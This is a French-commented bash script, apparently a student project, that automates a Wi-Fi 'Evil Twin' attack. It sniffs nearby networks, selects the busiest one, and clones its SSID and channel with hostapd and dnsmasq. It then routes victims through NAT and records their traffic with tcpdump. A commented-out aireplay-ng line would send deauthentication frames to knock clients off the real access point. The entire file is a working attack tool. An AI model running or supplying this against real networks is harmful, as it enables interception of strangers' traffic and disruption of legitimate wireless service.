#!/bin/bash

#############################
# Auteur: Quentin Auspitz  #
# Pojet: Evil Twin         #
# Date: 12/07/2023         # 
#############################

echo '
                                  .::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$ 
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P 
      $$$$$##WX!:      .<!!!!UW$$$$   $$$$$$$$# 
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$* 
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R" 
        "*$bd$$$$      "*$$$$$$$$$$$o+#" 
             """"          """"""" 
'


echo "[+] Mise à jour"

#sudo apt upgrade -y && sudo apt update -y

# Installer hostapd

sudo apt install hostapd

# Installer dnsmasq

sudo apt install dnsmasq

echo "[+] Les paquets ont été installé correctement"

########## Créer le répertoire evil_twin ##########


# La création du répertoire permet de stocker les différents fichiers créés

mkdir evil_twin

cd evil_twin

########## Sniffer le réseau ##########

echo "[+] Détection des réseaux"

echo " "

# Tuer les processus bloquants

sudo airmon-ng check kill

# Passer l’interface en mode monitor

sudo airmon-ng start wlan0

# Récupérer des ondes sniffer pendant 15s et les enregistrer dans la sortie “psk”

sudo timeout --foreground 15s airodump-ng wlan0 -w psk

# Quitter le mode monitor

sudo airmon-ng stop wlan0

# Redémarrer le service réseaux

sudo systemctl restart NetworkManager


echo "[+] Récupération du réseau le plus actif"

echo " "

########## MODE ROUTEUR ##########

# La configurration en mode routeur permet l'accès à internet

echo "[+] Installation et configuration du mode routeur"

echo " "

# Tout d'abord mettre le système en mode routeur

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Nettoyer de la table de routage (suppression de la table NAT et vider les règles de la table NAT)

sudo iptables -t nat -X
sudo iptables -t nat -F

# Permet d'ajouter une règle à la table de NAT pour masquer les adresses IP source lors du passage du traffic

sudo iptables -I POSTROUTING -t nat -o wlan1 -j MASQUERADE

# Permet à la gateway d'être accessible

sudo ip addr add 192.168.1.254/24 dev wlan0

######### RÉSEAU LE PLUS ACTIF ##########

# Trie du fichier psk-01.kismet.csv pour y afficher le BSSID, le ESSID, la DATA et le CHANNEL dans l'ordre décroissant de la colonne DATA dans le fichier sortie.txt

sudo awk -F ';' '{print $4" "$3" "$6" "$14}' psk-01.kismet.csv | sort -nr -k3 > sortie.txt

# On récupère le bssid

bssid=$(head -1 sortie.txt | awk '{print $1}')

# On récupère le ESSID

essid=$(head -1 sortie.txt | awk '{print $2}')

# On récupère le channel

channel=$(head -1 sortie.txt | awk '{print $3}')

######### DNSMASQ ##########

# DNSMASQ permet de donner une configuration DHCP


echo "[+] Installation et configuration du DNSMASQ"

echo " "

# Créer un fichier dnsmasq.conf

touch dnsmasq.conf

# Y mettre l'interface que l'on souhaite de notre Rogue AP ainsi que son port

echo "interface=wlan0" > dnsmasq.conf
echo "port=5353" >> dnsmasq.conf

# Attribuer une IP à la victime

echo "dhcp-range=192.168.1.1,192.168.1.100,12h" >> dnsmasq.conf

# Définir le DNS

echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf

# Définir la passerelle du réseau

echo "dhcp-option=3,192.168.1.254" >> dnsmasq.conf

########## HOSTAPD ##########

# HOSTAPD permet de devenir un point d’accès qui va usurper un point d’accès

echo "[+] Configuration du HOSTAPD"

echo " "

# Créer un fichier hostapd.conf

touch hostapd.conf

# Y ajouter l’interface du point d’accès

echo "interface=wlan0" > hostapd.conf
 
# Ajouter le driver de la carte wifi

echo "driver=nl80211" >> hostapd.conf

# Ajout du ESSID(-evil) pour le nouveau point d'accèss

echo "ssid=$essid-evil" >> hostapd.conf 

# Mettre en mode g (2.4 GHz) le Wi-Fi

echo "hw_mode=g" >> hostapd.conf 

# Ajouter le channel du point usurpé

echo "channel=$channel" >> hostapd.conf 

########## Démarrer le Rogue AP ##########

# Ouvrir un terminal pour les logs de dnsmasq

sudo xterm -hold -e sudo dnsmasq -d -C dnsmasq.conf &

# Ouvrir un terminal pour les logs de hostapd

sudo xterm -hold -e sudo hostapd hostapd.conf &

########## TCPDUMP ##########

# Capturer le trafic utilisabe avec  WireShark

sudo tcpdump -i wlan0 -w %d-%m-%H-%M-evil_twin-data.cap

########## DDOS ##########

#echo "[+] DDOS"

#sudo aireplay-ng -0 50 -a $bssid wlan1

########## Fin de script ##########

echo "[+] SSID Evil Twin : $essid-evil"

#sudo systemctl restart NetworkManager
